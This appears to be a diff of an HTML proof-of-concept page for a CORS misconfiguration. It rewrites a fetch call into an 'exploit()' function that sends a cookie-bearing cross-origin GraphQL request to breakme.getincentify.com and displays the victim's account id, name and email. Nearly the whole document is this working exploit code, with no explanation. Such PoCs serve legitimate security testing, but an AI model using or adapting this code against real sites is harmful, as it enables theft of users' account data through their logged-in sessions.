@@ -1,40 +1,44 @@
 <!DOCTYPE html>
 <html>
     <body>
-        <h3>CORS PoC</h3>
+        <h3>Exploit Running…</h3>
+        <pre id="output"></pre>
 
         <script>
-            const target = "https://breakme.getincentify.com/graphql?AccountQuery";
+            function exploit() {
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", "https://breakme.getincentify.com/graphql?AccountQuery", true);
 
-            const query = `
-            query AccountQuery {
-                me {
-                    id
-                    displayName
-                    hasDiscoveryMap
-                    isWorkOrdersEnabled
-                    email
-                }
+                // Required for browser to send cookies
+                xhr.withCredentials = true;
+
+                xhr.setRequestHeader("Content-Type", "application/json");
+
+                xhr.onreadystatechange = function () {
+                    if (xhr.readyState === 4) {
+                        document.getElementById("output").textContent = 
+                            "STATUS: " + xhr.status + "\n\n" + xhr.responseText;
+                    }
+                };
+
+                var payload = {
+                    query: `query AccountQuery {
+                        me {
+                            id
+                            displayName
+                            hasDiscoveryMap
+                            isWorkOrdersEnabled
+                            email
+                        }
+                    }`,
+                    variables: {}
+                };
+
+                xhr.send(JSON.stringify(payload));
             }
-            `;
 
-            fetch(target, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({ query }),
-                credentials: "include"  // send cookies
-            })
-                .then(async response => {
-                    const text = await response.text();
-                    alert("Status: " + response.status + "\n\nResponse:\n" + text);
-                })
-                .catch(err => {
-                    alert("Error: " + err);
-                });
+            exploit();
         </script>
-
     </body>
 </html>
 
